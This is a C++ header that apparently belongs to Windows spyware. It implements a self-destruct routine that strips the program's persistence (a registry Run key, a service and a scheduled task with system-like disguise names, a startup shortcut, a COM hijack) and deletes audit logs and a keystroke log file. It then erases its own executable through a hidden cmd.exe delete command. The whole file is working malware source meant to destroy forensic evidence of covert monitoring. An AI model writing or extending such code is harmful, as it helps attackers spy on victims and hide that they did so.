#pragma once

#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <string>
#include <vector>

#include "domain/common/StringTable.hpp"
#include "infrastructure/system/AdvancedPersistence.hpp"

namespace nuub::infrastructure::system {

class SelfDestructService {
public:
    // Remove all persistence, logs, config, and delete the exe
    static bool execute(const std::string& config_path,
                        const std::string& auto_start_name,
                        const std::vector<std::string>& extra_files = {}) {
        // 1. Remove ALL persistence mechanisms
        remove_all_persistence(auto_start_name);

        // 2. Delete log files
        delete_file_safe(config_path);
        delete_file_safe(config_path + ".bak");
        delete_file_safe("audit.log");
        delete_file_safe("activity_log.csv");
        delete_file_safe("log_master.txt");

        // 3. Delete keystroke logs
        delete_file_safe("PC_keys.dat");

        // 4. Delete any extra files passed
        for (const auto& f : extra_files) {
            delete_file_safe(f);
        }

        // 5. Delete our own exe via cmd /c del
        wchar_t exe_path[MAX_PATH]{};
        GetModuleFileNameW(nullptr, exe_path, MAX_PATH);

        // Build delete command: cmd /c timeout /t 2 >nul & del /f /q "path"
        std::wstring cmd = L"cmd.exe /c timeout /t 2 >nul & del /f /q \"" +
                          std::wstring(exe_path) + L"\"";
        STARTUPINFOW si{};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        PROCESS_INFORMATION pi{};

        if (CreateProcessW(nullptr, cmd.data(), nullptr, nullptr,
                           FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }

        return true;
    }

private:
    static void remove_all_persistence(const std::string& auto_start_name) {
        // 1. Remove Registry Run key
        remove_registry(auto_start_name);

        // 2. Remove Windows Service
        AdvancedPersistence::remove_service("SystemCoreSvc");

        // 3. Remove Scheduled Task
        AdvancedPersistence::remove_scheduled_task("SystemUpdateTask");

        // 4. Remove Startup Folder shortcut
        AdvancedPersistence::remove_startup_folder("sysupdate");

        // 5. Remove COM hijack
        AdvancedPersistence::remove_com_hijack("50F79E2C-6E08-4F83-A5E0-8A3B1D5F6A2C");
    }

    static void remove_registry(const std::string& auto_start_name) {
        std::string reg_path = domain::StringTable::get("reg_run");
        std::wstring w_reg_path(reg_path.begin(), reg_path.end());

        HKEY hkey;
        if (RegOpenKeyExW(HKEY_CURRENT_USER, w_reg_path.c_str(),
                          0, KEY_SET_VALUE, &hkey) == ERROR_SUCCESS) {
            std::wstring w_name(auto_start_name.begin(), auto_start_name.end());
            RegDeleteValueW(hkey, w_name.c_str());
            RegCloseKey(hkey);
        }
    }

    static void delete_file_safe(const std::string& path) {
        std::remove(path.c_str());

        if (!path.empty()) {
            std::wstring wpath(path.begin(), path.end());
            DeleteFileW(wpath.c_str());
        }
    }
};

} // namespace nuub::infrastructure::system
#endif
